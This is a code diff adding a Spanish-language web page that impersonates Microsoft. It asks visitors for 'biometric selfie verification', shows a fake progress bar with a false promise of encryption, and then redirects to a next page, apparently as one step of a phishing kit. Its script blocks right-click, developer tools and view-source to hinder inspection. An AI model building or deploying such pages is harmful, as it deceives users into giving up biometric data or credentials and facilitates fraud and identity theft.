@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Verificación Biométrica</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+<style>
+*{
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#f2f2f2;
+}
+
+.card{
+    background:#fff;
+    width:100%;
+    max-width:420px;
+    padding:30px 25px;
+    border-radius:14px;
+    box-shadow:0 8px 25px rgba(0,0,0,0.08);
+    text-align:center;
+}
+
+.card h1{
+    margin:0;
+    font-size:26px;
+    font-weight:700;
+}
+
+.card h2{
+    margin:15px 0 10px;
+    font-size:17px;
+    font-weight:700;
+}
+
+.card p{
+    margin:0 0 20px;
+    font-size:14px;
+    color:#555;
+    line-height:1.4;
+}
+
+.info-box{
+    background:#cfeaf3;
+    border-left:4px solid #1f4fd8;
+    padding:15px;
+    border-radius:10px;
+    text-align:left;
+    margin-bottom:22px;
+}
+
+.info-box .title{
+    color:#d60000;
+    font-weight:700;
+    margin-bottom:10px;
+    display:flex;
+    align-items:center;
+    gap:8px;
+}
+
+.info-box ul{
+    padding:0;
+    margin:0;
+    list-style:none;
+}
+
+.info-box li{
+    display:flex;
+    gap:10px;
+    font-size:14px;
+    margin-bottom:8px;
+    color:#000;
+}
+
+.info-box li i{
+    color:#2aa745;
+    margin-top:2px;
+}
+
+.progress-container{
+    width:100%;
+    background:#e6e6e6;
+    border-radius:10px;
+    overflow:hidden;
+    margin-top:20px;
+    height:18px;
+}
+
+.progress-bar{
+    height:100%;
+    width:0%;
+    background:#1f4fd8;
+    transition:width 0.2s linear;
+}
+
+.progress-text{
+    margin-top:10px;
+    font-size:14px;
+    color:#555;
+}
+
+.security{
+    margin-top:18px;
+    font-size:13px;
+    color:#555;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:6px;
+}
+
+.security i{
+    color:#2aa745;
+}
+</style>
+
+<script> 
+    // Bloquear clic derecho
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+    document.onkeydown = function(e) {
+        if (
+            e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
+            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    }
+</script>
+
+
+</head>
+
+<body>
+
+<div class="card">
+
+<p><img src="https://odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.png?b=19606.30550" alt="Microsoft Logo" data-bind="attr: {alt: config.text.AbtMicrosoftLogo}" /></p>
+
+    <h1>Verificación Microsoft</h1>
+
+    <h2>Seguridad biométrica con foto tipo selfie</h2>
+
+    <div class="info-box">
+        <div class="title">
+            <i class="fa-solid fa-circle-exclamation"></i>
+            Instrucciones importantes
+        </div>
+        <ul>
+            <li><i class="fa-solid fa-circle-check"></i> Busque un lugar con buena iluminación</li>
+            <li><i class="fa-solid fa-circle-check"></i> Mantenga una expresión facial neutra</li>
+            <li><i class="fa-solid fa-circle-check"></i> Retire gafas, gorras o accesorios</li>
+            <li><i class="fa-solid fa-circle-check"></i> Asegure que su rostro sea visible</li>
+            <li><i class="fa-solid fa-circle-check"></i> Coloque la cámara a la altura de sus ojos</li>
+        </ul>
+    </div>
+
+    <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="progress-text" id="progressText">
+        Procesando verificación... 0%
+    </div>
+
+    <div class="security">
+        <i class="fa-solid fa-lock"></i>
+        Su información está protegida y encriptada
+    </div>
+
+</div>
+
+<script>
+let progress = 0;
+const bar = document.getElementById("progressBar");
+const text = document.getElementById("progressText");
+
+// 2000000 segundos exactos → 100 pasos de 200 ms
+const interval = setInterval(() => {
+    progress++;
+    bar.style.width = progress + "%";
+    text.textContent = "Procesando verificación... " + progress + "%";
+
+    if (progress >= 100) {
+        clearInterval(interval);
+        window.location.href = "3.html";
+    }
+}, 200);
+</script>
+
+</body>
+</html>
